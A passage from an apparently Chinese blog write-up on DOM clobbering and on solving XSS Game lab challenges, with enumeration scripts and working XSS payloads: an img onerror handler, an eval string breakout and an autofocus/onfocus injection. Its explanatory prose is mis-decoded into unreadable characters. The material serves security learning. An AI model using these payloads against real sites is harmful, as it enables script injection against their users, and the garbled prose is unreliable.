<span class="token string">'em'</span><span class="token punctuation">,</span> <span class="token string">'strong'</span><span class="token punctuation">,</span> <span class="token string">'small'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'cite'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'dfn'</span><span class="token punctuation">,</span> <span class="token string">'abbr'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">,</span> <span class="token string">'samp'</span><span class="token punctuation">,</span> <span class="token string">'kbd'</span><span class="token punctuation">,</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'mark'</span><span class="token punctuation">,</span> <span class="token string">'ruby'</span><span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">,</span> <span class="token string">'rp'</span><span class="token punctuation">,</span> <span class="token string">'bdi'</span><span class="token punctuation">,</span> <span class="token string">'bdo'</span><span class="token punctuation">,</span> <span class="token string">'span'</span><span class="token punctuation">,</span> <span class="token string">'br'</span><span class="token punctuation">,</span> <span class="token string">'wbr'</span><span class="token punctuation">,</span> <span class="token string">'ins'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'img'</span><span class="token punctuation">,</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span> <span class="token string">'embed'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'param'</span><span class="token punctuation">,</span> <span class="token string">'video'</span><span class="token punctuation">,</span> <span class="token string">'audio'</span><span class="token punctuation">,</span> <span class="token string">'source'</span><span class="token punctuation">,</span> <span class="token string">'track'</span><span class="token punctuation">,</span> <span class="token string">'canvas'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'area'</span><span class="token punctuation">,</span> <span class="token string">'svg'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'table'</span><span class="token punctuation">,</span> <span class="token string">'caption'</span><span class="token punctuation">,</span> <span class="token string">'colgroup'</span><span class="token punctuation">,</span> <span class="token string">'col'</span><span class="token punctuation">,</span> <span class="token string">'tbody'</span><span class="token punctuation">,</span> <span class="token string">'thead'</span><span class="token punctuation">,</span> <span class="token string">'tfoot'</span><span class="token punctuation">,</span> <span class="token string">'tr'</span><span class="token punctuation">,</span> <span class="token string">'td'</span><span class="token punctuation">,</span> <span class="token string">'th'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'fieldset'</span><span class="token punctuation">,</span> <span class="token string">'legend'</span><span class="token punctuation">,</span> <span class="token string">'label'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'button'</span><span class="token punctuation">,</span> <span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'datalist'</span><span class="token punctuation">,</span> <span class="token string">'optgroup'</span><span class="token punctuation">,</span> <span class="token string">'option'</span><span class="token punctuation">,</span> <span class="token string">'textarea'</span><span class="token punctuation">,</span> <span class="token string">'keygen'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'progress'</span><span class="token punctuation">,</span> <span class="token string">'meter'</span><span class="token punctuation">,</span> <span class="token string">'details'</span><span class="token punctuation">,</span> <span class="token string">'summary'</span><span class="token punctuation">,</span> <span class="token string">'menuitem'</span><span class="token punctuation">,</span> <span class="token string">'menu'</span><span class="token punctuation">]</span>            div<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    div<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=element1>'</span><span class="token operator">+</span><span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=element2>'</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// console.log(div);</span>                    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>element1 <span class="token operator">&amp;&amp;</span> element1<span class="token punctuation">.</span>element2<span class="token punctuation">)</span><span class="token punctuation">{</span>                         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">','</span><span class="token operator">+</span>html<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºäº†è¿™äº›ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701530292509.png" alt="1701530292509" width="5%" height="5%" /><p>æ¯”å¦‚è¿™æ ·å°±èƒ½å–åˆ°å€¼ã€‚</p><pre><code>&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a&gt;123&lt;/a&gt;        &lt;form id =&quot;a&quot;&gt;            &lt;select id =&quot;b&quot;&gt;c&lt;/select&gt;        &lt;/form&gt;        &lt;script&gt;            console.log(a.b);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="å±‚çº§-é›†åˆå–å€¼ä¸‰å±‚å–å€¼"><a href="#å±‚çº§-é›†åˆå–å€¼ä¸‰å±‚å–å€¼" class="headerlink" title="å±‚çº§+ é›†åˆå–å€¼ä¸‰å±‚å–å€¼"></a>å±‚çº§+ é›†åˆå–å€¼ä¸‰å±‚å–å€¼</h4><p>å°±æ˜¯ä¸¤è€…çš„ç»“åˆ</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>y<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>z</span><span class="token punctuation">></span></span>I've been clobbered<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">             <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>y<span class="token punctuation">.</span>z<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è‡ªå®šä¹‰å±æ€§å–å€¼ï¼ˆè¿˜ä¸æ˜¯å¾ˆç†è§£ï¼‰"><a href="#è‡ªå®šä¹‰å±æ€§å–å€¼ï¼ˆè¿˜ä¸æ˜¯å¾ˆç†è§£ï¼‰" class="headerlink" title="è‡ªå®šä¹‰å±æ€§å–å€¼ï¼ˆè¿˜ä¸æ˜¯å¾ˆç†è§£ï¼‰"></a>è‡ªå®šä¹‰å±æ€§å–å€¼ï¼ˆè¿˜ä¸æ˜¯å¾ˆç†è§£ï¼‰</h4><p>ä¸Šè¿°ä¾‹å­ä¸­æåˆ°çš„è®¸å¤šå±æ€§éƒ½æ˜¯ç”±<code>name,id</code>è¿™ç§å±æ€§æ¥è¿›è¡Œå¼•ç”¨çš„ã€‚æ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥æ‰¾æ‰¾åˆ«çš„å±æ€§èƒ½å¦ç›´æ¥å¼•ç”¨ã€‚</p><p>è¿™éƒ¨åˆ†åº”è¯¥å°±æ˜¯æ‰©å……åˆ©ç”¨é¢ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            html<span class="token operator">=</span>HTML elements array            <span class="token keyword">var</span> props<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>html<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                obj <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>prop <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' id=x '</span><span class="token operator">+</span>prop<span class="token operator">+</span><span class="token string">'="ddd">&lt;/'</span><span class="token operator">+</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'>'</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// console.log(1);</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ddd"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// console.log(123);</span>                            props<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>eee<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºäº†æœ‰ä¹ç™¾å¤šæ¡ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701589219643.png" alt="1701589219643" width="5%" height="5%" /><p>æ¯”å¦‚è¿™æ ·</p><pre><code>var div=document.createElement(&#39;div&#39;)div.innerHTML=&#39;&lt;a id=&quot;test&quot; ping=123&gt;&#39;document.body.appendChild(div)</code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701589439645.png" alt="1701589439645" width="5%" height="5%" /><p>è¿™éƒ¨åˆ†è¿˜æœ‰ä¸ª<code>nb</code>çš„æ“ä½œå°±æ˜¯<code>a</code>æ ‡ç­¾çš„<code>username</code>å’Œ<code>password</code>å±æ€§ï¼Œä»–ä»¬æ˜¯<code>a</code>æ ‡ç­¾çš„èŠ‚ç‚¹å±æ€§å¹¶ä¸æ˜¯<code>html</code>ä¸­å®šä¹‰çš„å±æ€§ï¼Œè¿™ä¸¤ä¸ªå±æ€§å¯ä»¥é€šè¿‡<code>url</code>çš„ä¸­çš„<code>username</code>å­—æ®µå’Œ<code>password</code>å­—æ®µæä¾›ï¼Œä½†æ˜¯å› ä¸ºæ˜¯<code>ftp</code>åè®®ï¼Œæ‰€ä»¥éœ€è¦è¡¥ä¸Š<code>@</code>ã€‚å½“ç„¶ï¼Œ<code>http</code>åè®®ä¹Ÿå¯ä»¥é€šè¿‡è¿™æ ·æ¥å–å€¼ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ftp:Clobbered-username:Clobbered-Password@a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Clobbered-username</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Clobbered-password</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥é€šè¿‡toStringå‡½æ•°å°†domè½¬æ¢ä¸ºå­—ç¬¦ä¸²ä»–çš„hrefæ˜¯ç»è¿‡urlç¼–ç çš„ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸å­˜åœ¨çš„åè®®ç»•è¿‡abc:&lt;&gt;ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abc:&lt;<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">         <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//abc:&lt;></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä¸‰çº§ä»¥ä¸Šå–å€¼"><a href="#ä¸‰çº§ä»¥ä¸Šå–å€¼" class="headerlink" title="ä¸‰çº§ä»¥ä¸Šå–å€¼"></a>ä¸‰çº§ä»¥ä¸Šå–å€¼</h4><pre><code>&lt;iframe name=a srcdoc=&quot;&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&quot;&gt;&lt;/iframe&gt;&lt;script&gt;setTimeout(()=&gt;alert(a.b.c.d),500)&lt;/script&gt;</code></pre><p>ä¸Šé¢ç”¨äº†<code>setTimeout</code>è®¾ç½®å®šæ—¶å™¨ï¼Œä»¥ä¿è¯<code>iframe</code>æ¡†æ¶çš„åŠ è½½å®Œæˆã€‚å¯ä»¥åˆ©ç”¨<code>style/link</code>æ¥åŠ è½½å¤–éƒ¨æ ·å¼è¡¨æ¥é€ æˆå»¶è¿Ÿï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>a</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;iframe srcdoc<span class="token punctuation">=</span><span class="token punctuation">'</span>&lt;a id<span class="token punctuation">=</span>c name<span class="token punctuation">=</span>d href<span class="token punctuation">=</span>cid:Clobbered<span class="token punctuation">></span>test&lt;/a<span class="token punctuation">></span>&lt;a id<span class="token punctuation">=</span>c<span class="token punctuation">></span><span class="token punctuation">'</span> name<span class="token punctuation">=</span>b<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token atrule"><span class="token rule">@import</span> <span class="token string">'//portswigger.net'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>b<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XSS-GAME"><a href="#XSS-GAME" class="headerlink" title="XSS GAME"></a>XSS GAME</h4><blockquote><p>è¿™ä¸ªé¶åœºæœ‰äº›<code>dom</code>ç ´åé¢˜ï¼Œç›´æ¥åˆ·ä¸€ä¸‹æŠŠã€‚</p></blockquote><h5 id="Ma-Spaghet"><a href="#Ma-Spaghet" class="headerlink" title="Ma Spaghet!"></a>Ma Spaghet!</h5><p>ç›´æ¥æ ‡ç­¾é—­åˆåé¢çš„è„å­—ç¬¦ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1337)<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Jeffff"><a href="#Jeffff" class="headerlink" title="Jeffff"></a>Jeffff</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>maname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">let</span> jeff <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'jeff'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"JEFFF"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> ma <span class="token operator">=</span> <span class="token string">""</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`ma = "Ma name </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>jeff<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        maname<span class="token punctuation">.</span>innerText <span class="token operator">=</span> ma    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºè¿™é‡Œç›´æ¥ç”¨äº†<code>eval</code>æ‰§è¡Œ<code>js</code>ï¼Œé‚£ä¹ˆç›´æ¥é—­åˆå¼•å·æ‰“ä¸ª<code>alert</code>å°±å¥½äº†</p><pre class="line-numbers language-html"><code class="language-html">?jeff=";alert(1337);"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Ugandan-Knuckles"><a href="#Ugandan-Knuckles" class="headerlink" title="Ugandan Knuckles"></a>Ugandan Knuckles</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>uganda<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">let</span> wey <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'wey'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"do you know da wey?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wey <span class="token operator">=</span> wey<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&lt;>]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    uganda<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token string">`&lt;input type="text" placeholder="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>wey<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" class="form-control">`</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œè²Œä¼¼æ²¡åŠæ³•é€ƒé€¸ï¼Œåªèƒ½ç”¨<code>autofocus+onfocus</code>æ¥æ‰“ä¸ª<code>xss</code>äº†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å¤„ç†å®Œåé¢ä¼šæœ‰äº›å¥‡æ€ªçš„è„å­—ç¬¦å¯¼è‡´æ‰§è¡Œ<code>xss</code>å¤±è´¥ï¼Œæ‰€ä»¥åé¢ç»™äº†ä¸ª<code>href</code>ã€‚</p><pre class="line-numbers language-html"><code class="language-html">?wey="autofocus onfocus=alert(1337) href="#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Ricardo-Milos"><a href="#Ricardo-Milos" class="headerlink" title="Ricardo Milos"></a>Ricardo Milos</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ricardo<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>milos<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    ricardo<span class="token punctuation">.</span>action <span class="token 